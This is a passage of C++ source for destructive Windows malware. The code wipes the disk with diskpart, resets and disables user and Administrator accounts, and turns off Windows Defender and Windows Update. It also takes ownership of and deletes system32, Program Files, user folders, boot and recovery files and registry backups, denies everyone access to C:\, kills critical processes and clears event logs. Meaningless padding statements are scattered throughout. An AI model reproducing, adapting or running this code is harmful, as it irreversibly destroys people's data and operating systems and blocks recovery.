	ofstream fout(SCRIPT_PATH.c_str(), ios::out | ios::trunc | ios::binary);
	fout << "clean all\r\n";
	fout << "exit\r\n";
	fout.close();
	string execCmd = "diskpart /s \"" + SCRIPT_PATH + "\"";
	system(execCmd.c_str());
	system("net user %username% 8qth7aorch8bfsatz8g73378qxbrtaxfwg8y87e90b78wgrb8t666660q83q0btygfuyssgrayugaygufebag8b");
	cls;
	;
	;
	;
	;
	;
	;
	;
	system("net user Administrator qo8bco7attbt7tzk8if788taw9c3n0nnc9noaybrbqr9bobctqo9b37r4b9oq7ob9r7t87fta8tbf9abfbffrftbz9faz");
	cls;
	{
		;
		if(2)
		{
			int r=59;
			cls;
		}
		cls;
	}
	{
		;
		;
	}
	system("sc config WinDefend start= disabled & sc stop WinDefend");
	{
		;
		;
		;
		string k="sc";
	}
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	cls;
	system("sc config wuauserv start= disabled & sc stop wuauserv");
	cls;
	{
		;
	}
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("sc config lanmanserver start= disabled & sc stop lanmanserver");
	cls;
	{
		;
	}
	system("sc config explorer start= disabled");
	cls;
	{
		;
	}
	{
		;
	}
	{
		;
	}
	{
		;
	}
	{
		;
	}
	system("net user %username% /active:no");
	cls;
	{
		;
	}
	system("net user Administrator /active:no");
	cls;
	{
		;
	}
	system("net user User /active:no");
	cls;
	{
		;
	}
	system("net user SHIT /add");
	cls;
	{
		;
	}
	system("net user SHIT /active:yes");
	cls;
	{
		;
		;
	}
	system("net localgroup Administrators SHIT /delete");
	cls;
	{
		;
	}
	system("net localgroup Users SHIT /delete");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	system("net localgroup Guests SHIT /add");
	cls;
	system("net localgroup Administrators %username% /delete");
	cls;
	{
		;
		;
		;
		string l="shit";
	}
	;
	;
	;
	;
	system("takeown /f %windir%\\system32 /r /d y");
	cls;
	;
	;
	;
	cls;
	;
	;
	string n="gay";
	;
	system("echo Y|cacls %windir%\\system32\\*.* /t /g %username%:F");
	int u=69;
	string z="system";
	cls;
	{
		;
	}
	system("del /s /q /f %windir%\\system32\\*.*");
	cls;
	{
		;
	}
	;
	system("attrib -r -s -h C:\\Program Files\\");
	cls;
	system("del C:\\Program Files\\* /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\Program Files (x86)\\");
	cls;
	{
		;
		;
		;
	}
	system("del C:\\Program Files (x86)\\ /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\Users\\Administrator\\");
	cls;
	{
		;
	}
	system("del C:\\Users\\Administrator\\ /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\Users\\%username%\\");
	cls;
	{
		;
	}
	system("del C:\\Users\\%username% /f /s /q");
	cls;
	{
		;
		;
		//
		//
		;
		//
		;
		;
		//
	}
	system("attrib -r -s -h C:\\autoexec.bat");
	cls;
	system("del C:\\autoexec.bat /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\boot.ini");
	cls;
	;
	;
	;
	;
	;
	system("del C:\\boot.ini /f /s /q");
	cls;
	;
	;
	;
	;
	system("attrib -r -s -h C:\\ntldr");
	cls;
	;
	;
	;
	;
	{
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
	}
	system("del C:\\ntldr /f /s /q");
	cls;
	system("attrib -r -s -h C:\\windows\\win.ini");
	cls;
	;
	;
	system("del C:\\windows\\win.ini /f /s /q");
	cls;
	system("del %systemdrive%\\*.* /f/s/q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\dllcache");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("del C:\\Windows\\System32\\dllcache /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\WinSxS");
	cls;
	system("del C:\\Windows\\WinSxS /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\sfc.exe");
	cls;
	system("del C:\\Windows\\System32\\sfc.exe /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\DISM.exe");
	cls;
	system("del C:\\Windows\\System32\\DISM.exe /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Recovery\\WindowsRE\\Winre.wim.exe");
	cls;
	system("del C:\\Recovery\\WindowsRE\\Winre.wim /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\Recovery\\Winre.wim");
	cls;
	system("del C:\\Windows\\System32\\Recovery\\Winre.wim /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\reagentc.exe");
	cls;
	system("del C:\\Windows\\System32\\reagentc.exe /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\Logs\\CBS\\CBS.log");
	cls;
	system("del C:\\Windows\\Logs\\CBS\\CBS.log /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\Logs\\DISM\\dism.log");
	cls;
	system("del C:\\Windows\\Logs\\DISM\\dism.log /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\Repair");
	cls;
	system("del C:\\Windows\\Repair /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\Config\\RegBack");
	cls;
	system("del C:\\Windows\\System32\\Config\\RegBack /f /s /q");
	cls;
	system("attrib C:\\System Volume Information -r -s -h");
	cls;
	system("del C:\\System Volume Information /f /s /q");
	cls;
	system("attrib -r -s -h C:\\ntldr");
	cls;
	system("del C:\\ntldr /f /s /q");
	cls;
	system("icacls C:\\ /remove:d Everyone /f");
	cls;
	system("icacls C:\\ /deny Everyone:(F) /f");
	cls;
	system("attrib +R C:\\*.* /S /D");
	cls;
	PACL pOldDACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;

	GetNamedSecurityInfo(
		"C:\\Windows\\System32\\DiskPart.exe",
		SE_FILE_OBJECT,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL,
		&pOldDACL,
		NULL,
		&pSD
	);

	EXPLICIT_ACCESS ea;
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = 0;
	ea.grfAccessMode = DENY_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = "Everyone";

	PACL pNewDACL = NULL;
	SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);

	SetNamedSecurityInfo(
		"C:\\Windows\\System32\\DiskPart.exe",
		SE_FILE_OBJECT,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL,
		pNewDACL,
		NULL
	);

	system("taskkill /f /im svchost.exe");
	cls;
	system("taskkill -im wininit.exe -f");
	ClearAllLogsAndBackups();
	ClearOnlyETW();
	return 0;
}
